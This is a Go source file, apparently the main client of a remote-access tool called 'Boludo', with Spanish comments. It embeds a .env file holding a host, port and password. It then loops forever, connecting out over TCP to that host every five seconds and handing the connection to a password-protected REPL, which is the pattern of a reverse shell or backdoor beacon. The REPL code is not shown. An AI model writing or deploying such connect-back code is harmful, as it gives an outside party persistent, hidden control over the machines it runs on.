package main

import (
	"Boludo/core"
	"embed"
	"fmt"
	"log"
	"net"
	"os"
	"time"

	"github.com/joho/godotenv"
)

// Directiva ! no borrar
//
//go:embed .env
var ArchivosIncrustados embed.FS

//
//
// Fin Directivas

func init() {
	// Leer el archivo incrustado
	Datos, err := ArchivosIncrustados.ReadFile(".env")
	if err != nil {
		log.Fatalf("Error al leer .env: %v", err)
	}

	// Cargar las variables en un mapa
	envMap, err := godotenv.Unmarshal(string(Datos))
	if err != nil {
		log.Fatalf("Error al deserializar .env: %v", err)
	}

	// Establecer las variables de entorno
	for Variable, valor := range envMap {
		err := os.Setenv(Variable, valor)
		if err != nil {
			log.Fatalf("Error al establecer variable de entorno: %v", err)
		}
	}
}

func main() {
	for {
		// Resolver DNS
		IP, err := net.LookupIP(os.Getenv("HOST"))
		if err != nil {
			log.Printf("Error al resolver DNS: %v", err)
			continue
		}

		for _, ip := range IP {
			// Armar direccion
			Direccion := fmt.Sprintf("%s:%s", ip, os.Getenv("PORT"))
			fmt.Printf("Intentando conectar a: %s\n", Direccion)
			///////////////////////////////////////////////////////////
			///////////////////AQUI LOGICA/////////////////////////////
			conn, err := net.Dial("tcp", Direccion)
			if err != nil {
				fmt.Printf("Error al conectar: %v\n", err)
				continue
			} else {
				core.REPL(conn, os.Getenv("PASSWORD"))
			}
		}
		time.Sleep(5 * time.Second)
	}
}
